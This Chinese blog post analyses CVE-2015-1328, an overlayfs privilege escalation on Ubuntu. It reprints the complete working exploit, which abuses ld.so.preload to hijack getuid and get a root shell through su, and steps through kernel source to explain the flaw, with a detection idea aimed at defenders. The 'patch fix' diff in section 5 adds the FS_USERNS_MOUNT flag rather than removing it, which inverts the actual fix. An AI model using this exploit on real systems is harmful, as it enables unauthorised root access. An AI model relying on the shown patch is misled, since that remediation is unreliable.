# ubuntu系统权限提权 - BlueSky - CSDN博客
2015年10月16日 14:32:46[ASIA_kobe](https://me.csdn.net/ASIA_kobe)阅读数：3233
catalog
```
0. 引言
1. Description
2. Effected Scope
3. Exploit Analysis
4. Principle Of Vulnerability
5. Patch Fix
```
0. 引言
新技术、高性能技术的不断发展，越来越提升了操作系统的能力，而近几年出现的虚拟化技术，包括overlayfs虚拟层叠文件系统技术，则为docker这样的虚拟化方案提供了越来越强大的技术支撑，但是也同时带来了很多的安全问题
抛开传统的overflow溢出型漏洞不说，还有另一类漏洞属于"特性型"的漏洞，黑客利用系统原生提供的"功能"，加上一些特殊设计的"使用组合方式"，以此实现了非预期的操作结果，甚至root
这也再次告诉我们，在系统层和黑客进行攻防，就需要比黑客更加深刻理解系统本身的特性，以及在极端条件下它们的组合方式，因为这些组合方式很有可能能够转化为攻击向量
1. Description
Philip Pettersson discovered a privilege escalation when using overlayfs mounts inside of user namespaces. A local user could exploit this flaw to gain administrative privileges on the system
使用默认配置的ubuntu.所有版本存在该cve-2015-1328漏洞，允许本地root特权提升，当在upper文件系统目录中创建新文件时，overlayfs文件系统并不能恰当检查文件权限
该漏洞能被某非特权进程利用，此进程在内核中(带有CONFIG_USER_NS=y、且其位置的overlayfs带有FS_USERNS_MOUNT标志)，可让挂载的overlayfs在非特权的目录中挂载命名空间，
这是ubuntu12.04, 14.04, 14.10, and 15.04 [1].的默认配置
0x1: Overlay Filesystem
Relevant
 Link:
```
https://security-tracker.debian.org/tracker/CVE-2015-1328
http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html
http://www.freebuf.com/news/70615.html
http://seclists.org/oss-sec/2015/q2/717
https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
http://www.cnblogs.com/LittleHann/p/4083943.html
//搜索：0x4: overlayfs
```
2. Effected Scope
```
Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
```
3. Exploit Analysis
![](http://images0.cnblogs.com/blog2015/532548/201506/251105115808436.png)
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>
#define LIB 
"#include <unistd.h>"
"uid_t(*_real_getuid) (void);"
"char path[128];"
"uid_t getuid(void)"
"{"
"_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");"
"readlink(\"/proc/self/exe\", (char *) &path, 128);"
"if(geteuid() == 0 && !strcmp(path, \"/bin/su\"))"
"{\nunlink(\"/etc/ld.so.preload\");"
"unlink(\"/tmp/ofs-lib.so\");"
"setresuid(0, 0, 0);"
"setresgid(0, 0, 0);"
"execle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);"
"}"
"return _real_getuid();"
"}"
static char child_stack[1024*1024];
static int child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);
    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) 
    {
        // workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) 
        {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } 
    else 
        file = "ns_last_pid";
    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");
    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) 
    {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) 
        {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }
    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}
int main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;
    fprintf(stderr,"spawning threads\n");
    
    //创建子进程
    if((wrapper = fork()) == 0) 
    {
        //将子进程移动到新命名空间，和父进程分离
        if(unshare(CLONE_NEWUSER) != 0)
        fprintf(stderr, "failed to create new user namespace\n");
        //子进程继续创建子进程
        if((init = fork()) == 0) 
        {
            //新的子进程从新的函数入口点开始执行，相当于execve了一个新进程，新的子进程继续存在于一个新的命名空间中
            pid_t pid = clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) 
            {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }
            waitpid(pid, &status, 0); 
        } 
        waitpid(init, &status, 0);
        return 0;
    }
    usleep(300000);
    wait(NULL);
    fprintf(stderr,"child threads done\n");
    fd = open("/etc/ld.so.preload",O_WRONLY);
    if(fd == -1) 
    {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }
    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) 
    {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}
```
Relevant
 Link:
```
http://cxsecurity.com/issue/WLB-2015060081
https://www.exploit-db.com/exploits/37292/
```
4. Principle Of Vulnerability
我们以POC中使用都的API调用和特性为线索，逐步讨论overlayfs的相关"特性"，以及这些特性是如何最终形成一条攻击向量的
0x1: 创建子进程时传入CLONE_NEWNS
注意到POC中的这几行代码，涉及到了shared标志位、CLONE_NEWNS标志位
```
..
//创建子进程
    if((wrapper = fork()) == 0) 
    {
        //将子进程移动到新命名空间，和父进程分离
        if(unshare(CLONE_NEWUSER) != 0)
        fprintf(stderr, "failed to create new user namespace\n");
        //子进程继续创建子进程
        if((init = fork()) == 0) 
        {
            //新的子进程从新的函数入口点开始执行，相当于execve了一个新进程，新的子进程继续存在于一个新的命名空间中
            pid_t pid = clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
　　　　　　　　..
```
/source/kernel/fork.c
```
/*
 * unshare allows a process to 'unshare' part of the process
 * context which was originally shared using clone.  copy_*
 * functions used by do_fork() cannot be used here directly
 * because they modify an inactive task_struct that is being
 * constructed. Here we are modifying the current, active,
 * task_struct.
 */
SYSCALL_DEFINE1(unshare, unsigned long, unshare_flags)
{
    int err = 0;
    struct fs_struct *fs, *new_fs = NULL;
    struct sighand_struct *new_sigh = NULL;
    struct mm_struct *mm, *new_mm = NULL, *active_mm = NULL;
    struct files_struct *fd, *new_fd = NULL;
    struct nsproxy *new_nsproxy = NULL;
    int do_sysvsem = 0;
    check_unshare_flags(&unshare_flags);
    /* Return -EINVAL for all unsupported flags */
    err = -EINVAL;
    if (unshare_flags & ~(CLONE_THREAD|CLONE_FS|CLONE_NEWNS|CLONE_SIGHAND|
                CLONE_VM|CLONE_FILES|CLONE_SYSVSEM|
                CLONE_NEWUTS|CLONE_NEWIPC|CLONE_NEWNET))
        goto bad_unshare_out;
    /*
     * CLONE_NEWIPC must also detach from the undolist: after switching
     * to a new ipc namespace, the semaphore arrays from the old
     * namespace are unreachable.
     */
    if (unshare_flags & (CLONE_NEWIPC|CLONE_SYSVSEM))
        do_sysvsem = 1;
    if ((err = unshare_thread(unshare_flags)))
        goto bad_unshare_out;
    if ((err = unshare_fs(unshare_flags, &new_fs)))
        goto bad_unshare_cleanup_thread;
    if ((err = unshare_sighand(unshare_flags, &new_sigh)))
        goto bad_unshare_cleanup_fs;
    if ((err = unshare_vm(unshare_flags, &new_mm)))
        goto bad_unshare_cleanup_sigh;
    if ((err = unshare_fd(unshare_flags, &new_fd)))
        goto bad_unshare_cleanup_vm;
    if ((err = unshare_nsproxy_namespaces(unshare_flags, &new_nsproxy,
            new_fs)))
        goto bad_unshare_cleanup_fd;
    if (new_fs ||  new_mm || new_fd || do_sysvsem || new_nsproxy) {
        if (do_sysvsem) {
            /*
             * CLONE_SYSVSEM is equivalent to sys_exit().
             */
            exit_sem(current);
        }
        if (new_nsproxy) {
            switch_task_namespaces(current, new_nsproxy);
            new_nsproxy = NULL;
        }
        task_lock(current);
        if (new_fs) {
            fs = current->fs;
            write_lock(&fs->lock);
            current->fs = new_fs;
            if (--fs->users)
                new_fs = NULL;
            else
                new_fs = fs;
            write_unlock(&fs->lock);
        }
        if (new_mm) {
            mm = current->mm;
            active_mm = current->active_mm;
            current->mm = new_mm;
            current->active_mm = new_mm;
            activate_mm(active_mm, new_mm);
            new_mm = mm;
        }
        if (new_fd) {
            fd = current->files;
            current->files = new_fd;
            new_fd = fd;
        }
        task_unlock(current);
    }
    if (new_nsproxy)
        put_nsproxy(new_nsproxy);
bad_unshare_cleanup_fd:
    if (new_fd)
        put_files_struct(new_fd);
bad_unshare_cleanup_vm:
    if (new_mm)
        mmput(new_mm);
bad_unshare_cleanup_sigh:
    if (new_sigh)
        if (atomic_dec_and_test(&new_sigh->count))
            kmem_cache_free(sighand_cachep, new_sigh);
bad_unshare_cleanup_fs:
    if (new_fs)
        free_fs_struct(new_fs);
bad_unshare_cleanup_thread:
bad_unshare_out:
    return err;
}
```
/source/kernel/fork.c
```
static struct task_struct *copy_process(unsigned long clone_flags,
                    unsigned long stack_start,
                    struct pt_regs *regs,
                    unsigned long stack_size,
                    int __user *child_tidptr,
                    struct pid *pid,
                    int trace)
{
    int retval;
    struct task_struct *p;
    int cgroup_callbacks_done = 0;
    /*
    1. 对传入的clone_flag进行检查
    */
    if ((clone_flags & (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))
        return ERR_PTR(-EINVAL);
 
    if ((clone_flags & CLONE_THREAD) && !(clone_flags & CLONE_SIGHAND))
        return ERR_PTR(-EINVAL);
 
    if ((clone_flags & CLONE_SIGHAND) && !(clone_flags & CLONE_VM))
        return ERR_PTR(-EINVAL);
 
    if ((clone_flags & CLONE_PARENT) &&
                current->signal->flags & SIGNAL_UNKILLABLE)
        return ERR_PTR(-EINVAL);
    ..
    /* 
    copy all the process information 
    根据clone_flags复制父进程的资源到子进程，对于clone_flags指定共享的资源，父子进程间共享这些资源，仅仅设置子进程的相关指针，并增加资源数据结构的引用计数
    */
    if ((retval = copy_semundo(clone_flags, p)))
        goto bad_fork_cleanup_audit;
    if ((retval = copy_files(clone_flags, p)))
        goto bad_fork_cleanup_semundo;
    if ((retval = copy_fs(clone_flags, p)))
        goto bad_fork_cleanup_files;
    if ((retval = copy_sighand(clone_flags, p)))
        goto bad_fork_cleanup_fs;
    if ((retval = copy_signal(clone_flags, p)))
        goto bad_fork_cleanup_sighand;
    if ((retval = copy_mm(clone_flags, p)))
        goto bad_fork_cleanup_signal;
    //复制命名空间
    if ((retval = copy_namespaces(clone_flags, p)))
    ..
```
/source/kernel/nsproxy.c
```
/*
 * called from clone.  This now handles copy for nsproxy and all
 * namespaces therein.
 */
int copy_namespaces(unsigned long flags, struct task_struct *tsk)
{
    struct nsproxy *old_ns = tsk->nsproxy;
    struct nsproxy *new_ns;
    int err = 0;
    if (!old_ns)
        return 0;
    get_nsproxy(old_ns);
    //检查flag
    if (!(flags & (CLONE_NEWNS | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNET)))
        return 0;
    if (!capable(CAP_SYS_ADMIN)) {
        err = -EPERM;
        goto out;
    }
    /*
     * CLONE_NEWIPC must detach from the undolist: after switching
     * to a new ipc namespace, the semaphore arrays from the old
     * namespace are unreachable.  In clone parlance, CLONE_SYSVSEM
     * means share undolist with parent, so we must forbid using
     * it along with CLONE_NEWIPC.
     */
    if ((flags & CLONE_NEWIPC) && (flags & CLONE_SYSVSEM)) 
    {
        err = -EINVAL;
        goto out;
    }
    //创建新的namespace
    new_ns = create_new_namespaces(flags, tsk, tsk->fs);
    if (IS_ERR(new_ns)) 
    {
        err = PTR_ERR(new_ns);
        goto out;
    }
    tsk->nsproxy = new_ns;
out:
    put_nsproxy(old_ns);
    return err;
}
```
/source/kernel/nsproxy.c
```
/*
 * Create new nsproxy and all of its the associated namespaces.
 * Return the newly created nsproxy.  Do not attach this to the task,
 * leave it to the caller to do proper locking and attach it to task.
 */
static struct nsproxy *create_new_namespaces(unsigned long flags, struct task_struct *tsk, struct fs_struct *new_fs)
{
    struct nsproxy *new_nsp;
    int err;
    new_nsp = create_nsproxy();
    if (!new_nsp)
        return ERR_PTR(-ENOMEM);
    //创建新的挂载点命名空间
    new_nsp->mnt_ns = copy_mnt_ns(flags, tsk->nsproxy->mnt_ns, new_fs);
    if (IS_ERR(new_nsp->mnt_ns)) 
    {
        err = PTR_ERR(new_nsp->mnt_ns);
        goto out_ns;
    }
    ..
```
/source/fs/namespace.c
```
struct mnt_namespace *copy_mnt_ns(unsigned long flags, struct mnt_namespace *ns, struct fs_struct *new_fs)
{
    struct mnt_namespace *new_ns;
    BUG_ON(!ns);
    get_mnt_ns(ns);
    if (!(flags & CLONE_NEWNS))
        return ns;
    //复制挂载命名空间
    new_ns = dup_mnt_ns(ns, new_fs);
    put_mnt_ns(ns);
    return new_ns;
}
```
/source/fs/namespace.c
```
/*
 * Allocate a new namespace structure and populate it with contents
 * copied from the namespace of the passed in task structure.
 */
static struct mnt_namespace *dup_mnt_ns(struct mnt_namespace *mnt_ns, struct fs_struct *fs)
{
    struct mnt_namespace *new_ns;
    struct vfsmount *rootmnt = NULL, *pwdmnt = NULL;
    struct vfsmount *p, *q;
    new_ns = alloc_mnt_ns();
    if (IS_ERR(new_ns))
        return new_ns;
    down_write(&namespace_sem);
    /* First pass: copy the tree topology */
    new_ns->root = copy_tree(mnt_ns->root, mnt_ns->root->mnt_root, CL_COPY_ALL | CL_EXPIRE);
    if (!new_ns->root) 
    {
        up_write(&namespace_sem);
        kfree(new_ns);
        return ERR_PTR(-ENOMEM);
    }
    spin_lock(&vfsmount_lock);
    list_add_tail(&new_ns->list, &new_ns->root->mnt_list);
    spin_unlock(&vfsmount_lock);
    /*
     * Second pass: switch the tsk->fs->* elements and mark new vfsmounts
     * as belonging to new namespace.  We have already acquired a private
     * fs_struct, so tsk->fs->lock is not needed.
     */
    p = mnt_ns->root;
    q = new_ns->root;
    while (p) 
    {
        q->mnt_ns = new_ns;
        if (fs) 
        {
            if (p == fs->root.mnt) 
            {
                rootmnt = p;
                fs->root.mnt = mntget(q);
            }
            if (p == fs->pwd.mnt) 
            {
                pwdmnt = p;
                fs->pwd.mnt = mntget(q);
            }
        }
        p = next_mnt(p, mnt_ns->root);
        q = next_mnt(q, new_ns->root);
    }
    up_write(&namespace_sem);
    if (rootmnt)
        mntput(rootmnt);
    if (pwdmnt)
        mntput(pwdmnt);
    return new_ns;
}
```
因为overlayfs mount需要CAP_SYS_MOUNT能力，因此需要新建一个NEWUSER的namespace，这样就有CAP_SYS_MOUNT了(即使这样也需要overlayfs在编译的时候开启了FS_USERNS_MOUNT)
0x2: 两次overlayfs mount/unount
POC先创建了用户exploit的目录和文件
```
system("rm -rf /tmp/ns_sploit");
mkdir("/tmp/ns_sploit", 0777);
mkdir("/tmp/ns_sploit/work", 0777);
mkdir("/tmp/ns_sploit/upper",0777);
mkdir("/tmp/ns_sploit/o",0777);
```
1. 第一次mount
```
//将lowerdir(/proc/sys/kernel)、upperdir(/tmp/ns_sploit/upper)作为overlayfs挂载到/tmp/ns_sploit/o中
if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) 
{
    // workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
    if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) 
    //将lowerdir(l/sys/kernel/security/apparmor)、upperdir(/tmp/ns_sploit/upper)、workdir(/tmp/ns_sploit/work)作为overlayfs挂载到/tmp/ns_sploit/o中
```
至此，已经将/proc/sys/kernel、/sys/kernel/security/apparmor作为lowerdir，全部挂载到了/tmp/ns_sploit/o中
```
1. 第一次lowerdir=/proc/sys/kernel upperdir=/tmp/ns_sploit/o
2. 然后rename(file,"ld.so.preload");
3. 这时候会从lowerdir复制一份file到upperdir，然后再重命名为ld.so.preload，并且这个文件的属主是root
4. 然后umount
```
第一次unmount
```
umount("/tmp/ns_sploit/o");
```
2. 第二次mount
```
if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) 
{
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) 
        {
```
第二次mount是在第一次mount的基础上进行的
```
1. 第一次mount已经实现了在/tmp/ns_sploit/o中创建了ld.so.preload文件
2. 第二次mount lowerdir=/tmp/ns_sploit/o upperdir=/etc
3. 然后chmod("/tmp/ns_sploit/o/ld.so.preload", 0777)，因为overlayfs的底层实现是合并两个文件夹，rename本质是写文件操作，写lowerdir的时候会先复制一份到upperdir再修改
4. 这就导致把/tmp/ns_sploit/o/ld.so.preload复制到了/etc目录，并且权限为0777
5. 同时这里的另一个关键漏洞是复制过程的权限判断有问题，overlayfs检查的不是当前用户能不能写upperdir，而是检测被写的文件的属主能不能写upperdir，权限判断错误实际上是在第二次mount中被利用的，从某种程度上来说，这就导致的越权写
```
做完了这一步之后，黑客获取到的能力有
```
1. 黑客有能力读取/etc/ld.so.preload文件内容，因为overlayfs挂载的关系
2. 因为overlayfs文件读写权限检查的漏洞，导致黑客有能力可以修改/etc/ld.so.preload文件内容
```
3. 使用ld.so.preload ring3劫持技术
```
..
//打开/etc/ld.so.preload文件
fd = open("/etc/ld.so.preload",O_WRONLY);
..
//编译生成用于函数劫持的hook so
lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
write(lib,LIB,strlen(LIB));
close(lib);
lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
..
//修改/etc/ld.so.preload，加入hook so
write(fd,"/tmp/ofs-lib.so\n",16);
close(fd);
system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
..
```
hook so
```
/*
劫持了getuid函数，并在hook func中执行
setresgid(0, 0, 0);
execle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);
直接获取root shell会话
*/
#define LIB 
"#include <unistd.h>"
"uid_t(*_real_getuid) (void);"
"char path[128];"
"uid_t getuid(void)"
"{"
"_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");"
"readlink(\"/proc/self/exe\", (char *) &path, 128);"
"if(geteuid() == 0 && !strcmp(path, \"/bin/su\"))"
"{\nunlink(\"/etc/ld.so.preload\");"
"unlink(\"/tmp/ofs-lib.so\");"
"setresuid(0, 0, 0);"
"setresgid(0, 0, 0);"
"execle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);"
"}"
"return _real_getuid();"
"}"
```
对整个入侵向量进行一下梳理
```
1. overlayfs的挂载特性(lowerdir、upperdir)是系统本身的特性，并不能严格意义上算是漏洞
2. 黑客通过两次的mount/unmount，实际上间接获得了对/etc/ld.so.preload的访问权限
3. 问题的关键在于overlayfs对upperdir文件写的权限检查逻辑有问题，overlayfs检查的不是当前用户能不能写upperdir，而是检测被写的文件的属主能不能写upperdir，这导致了黑客可以通过修改lowerdir来实现对upperdir文件的越权写
4. overlayfs实现了类似overflow的准备工作，真正发挥作用的explicit是Linux上传统的攻击技术: LD_PRELOAD/ld.so.reload劫持技术
```
Relevant
 Link:
```
https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
http://www.cnblogs.com/LittleHann/p/4083943.html
//搜索：0x4: overlayfs
```
5. Patch Fix
0x1: 检测方案
检查/etc/ld.so.preload中是否包含有恶意内容，如果发现，则认为是可疑事件
0x2: 修复方案
diff --git a/fs/overlayfs/super.c b/fs/overlayfs/super.c
```
@@ -816,6 +816,7 @@ static struct file_system_type ovl_fs_type = {
     .name        = "overlay",
     .mount        = ovl_mount,
     .kill_sb    = kill_anon_super,
+    .fs_flags    = FS_USERNS_MOUNT,
 };
 MODULE_ALIAS_FS("overlay");
```
0x3: Hotpatch方案
```
1. poc特征: su进程创建子进程/bin/sh，这在正常的strace su跟踪中是不应该出现的
2. 可以在进程管控中针对su创建子进程建立防御规则
```
Relevant
 Link:
```
https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/vivid/commit/?id=78ec4549
```
